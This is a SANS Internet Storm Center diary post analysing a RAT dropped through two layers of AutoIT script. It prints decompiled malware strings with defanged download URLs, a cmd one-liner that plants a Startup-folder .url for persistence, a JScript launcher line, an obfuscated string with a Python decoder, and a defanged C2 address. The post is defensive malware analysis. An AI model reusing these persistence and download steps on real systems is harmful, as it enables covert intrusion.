---
title: RAT Dropped By Two Layers of AutoIT Code, (Mon, May 19th)
url: https://isc.sans.edu/diary/rss/31960
source: SANS Internet Storm Center, InfoCON: green
date: 2025-05-20
fetch_date: 2025-10-06T22:28:43.091288
---

# RAT Dropped By Two Layers of AutoIT Code, (Mon, May 19th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31952)
* [next](/diary/31964)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [RAT Dropped By Two Layers of AutoIT Code](/forums/diary/RAT%2BDropped%2BBy%2BTwo%2BLayers%2Bof%2BAutoIT%2BCode/31960/)

**Published**: 2025-05-19. **Last Updated**: 2025-05-19 05:37:10 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/RAT%2BDropped%2BBy%2BTwo%2BLayers%2Bof%2BAutoIT%2BCode/31960/#comments)

Like .Net, AutoIT[[1](https://www.autoitscript.com/site/)] remains a popular language for years in the malware ecosystem. It's a simple language that can interact with all the components of the Windows operating system. I regularly discover AutoIT3 binaries (yes, it can be compiled). This weekend, I found a malware delivered through a double layer of AutoIT code!

The initial file is an executable called "1. Project & Profit.exe" (SHA256:b5fbae9376db12a3fcbc99e83ccad97c87fb9e23370152d1452768a3676f5aeb). This is an AutoIT compiled script. Once decompiled, the code is simple and contains interesting strings:

```

Global $VY9A = "hxxps://xcvbsfq32e42313[.]xyz/OLpixJTrO"
Global $ZX2B = "C:\Users\Public\Guard.exe"
Global $FW3N = "C:\Users\Public\PublicProfile.ps1"
$fU5L = ""hxxps://xcvbsfq32e42313[.]xyz/hYlXpuF.txt"""
$oF6L = ""C:\Users\Public\Secure.au3
```

It's behaviour is simple: It will generate the PublicProfile.ps1 and execute it.

An AutoIT interpreter will be downloaded (and saved as "C:\Users\Public\Guard.exe") as well as another piece of AutoIT script (the second layer)

Persistence is achieved via a simple .url file placed in the Startup directory:

```

cmd /k echo [InternetShortcut] > "C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SwiftWrite.url" & echo URL="C:\Users\admin\AppData\Local\WordGenius Technologies\SwiftWrite.js" >> "C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SwiftWrite.url" & exit
```

The JavaScript script will re-execute the AutoIT interpreter ("SwiftWrite.pif") with its second script ("G"):

```

new ActiveXObject("Wscript.Shell").Run("\"C:\\Users\\REM\\AppData\\Local\\WordGenius Technologies\\SwiftWrite.pif\" \"C:\\Users\\REM\\AppData\\Local\\WordGenius Technologies\\G\"")
```

Let's have a look at "G", the second layer of AutoIT code. This script is pretty well obfuscated. All strings are encoded using the Wales() function. Example:

```

If (Execute(Wales("80]114]111]99]101]115]115]69]120]105]115]116]115]40]39]97]118]97]115]116]117]105]46]101]120]101]39]41",0/2))) ...
```

The Wales function is simple, here is a Python version to help to decode all strings:

```

remnux@remnux:/MalwareZoo/20250518$ python3
Python 3.8.10 (default, Jun 22 2022, 20:18:18)
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> def Wales(encoded: str, key: int) -> str:
...     parts = [p for p in encoded.split("]") if p]
...     decoded = ''.join(chr(int(num) - key) for num in parts)
...     return decoded
...
>>> Wales("80]114]111]99]101]115]115]69]120]105]115]116]115]40]39]97]118]97]115]116]117]105]46]101]120]101]39]41",0)
"ProcessExists('avastui.exe')"
```

Finally, a "jsc.exe" process is spanwed and injected with the final malware as a DLL: Urshqbgpm.dll

![](https://isc.sans.edu/diaryimages/images/isc-20250519-1.png)

I'm not sure about the final malware because it tried to connect to the C2 server 139[.]99[.]188[.]124 on port 56001. This one is associated to AsyncRAT.

But, in the DLL, we can find a lot of references to PureHVNC[[2](https://cyble.com/blog/pure-coder-offers-multiple-malware-for-sale-in-darkweb-forums/)]:

![](https://isc.sans.edu/diaryimages/images/isc-20250519-2.png)

[1] <https://www.autoitscript.com/site/>
[2] <https://cyble.com/blog/pure-coder-offers-multiple-malware-for-sale-in-darkweb-forums/>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [AutoIT](/tag.html?tag=AutoIT) [Injection](/tag.html?tag=Injection) [PowerShell](/tag.html?tag=PowerShell) [RAT](/tag.html?tag=RAT) [Script](/tag.html?tag=Script)

[0 comment(s)](/diary/RAT%2BDropped%2BBy%2BTwo%2BLayers%2Bof%2BAutoIT%2BCode/31960/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/31952)
* [next](/diary/31964)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)